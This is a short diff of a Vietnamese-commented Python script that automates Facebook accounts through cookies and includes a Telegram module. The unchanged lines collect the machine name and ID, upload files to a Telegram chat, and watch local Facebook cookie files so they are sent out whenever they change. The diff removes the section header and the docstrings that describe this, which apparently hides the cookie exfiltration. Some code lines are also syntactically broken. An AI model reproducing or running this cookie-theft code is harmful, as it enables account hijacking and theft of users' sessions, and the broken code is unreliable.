@@ -762,10 +762,6 @@ def switch_facebook_account(cookie, authorization):
     add_account_fb(data['session'], authorization, data['user_id'])
     return data
 
-=====================================================================================
-PHẦN 3: MÃ NGUỒN AUTO TELEGRAM (Đã sửa đổi chu kỳ 15s)
-=====================================================================================
-
 Lấy thông tin máy tính để gửi lên Telegram
 MACHINE_NAME = platform.node()
 MACHINE_ID = get_device_id() get_device_id được định nghĩa trong PHẦN 1
@@ -797,7 +793,6 @@ def send_telegram_message(chat_id, text, message_id=None):
         return None
 
 def send_telegram_file(chat_id, file_path):
-    """Gửi tệp lên Telegram. Đã thêm Tên máy và ID máy vào caption."""
     url = get_base_url() + "/sendDocument"
     try:
         with open(file_path, 'rb') as f:
@@ -825,7 +820,6 @@ def send_telegram_file(chat_id, file_path):
         return False
 
 def check_cookie_changes():
-    """Kiểm tra sự thay đổi của các tệp cookie và gửi chúng nếu có."""
     global LAST_MODIFIED
     
     cookie_files = [f for f in os.listdir('.') if re.match(r'tdk-cookie-fb-bumx-\d+\.txt$', f)]
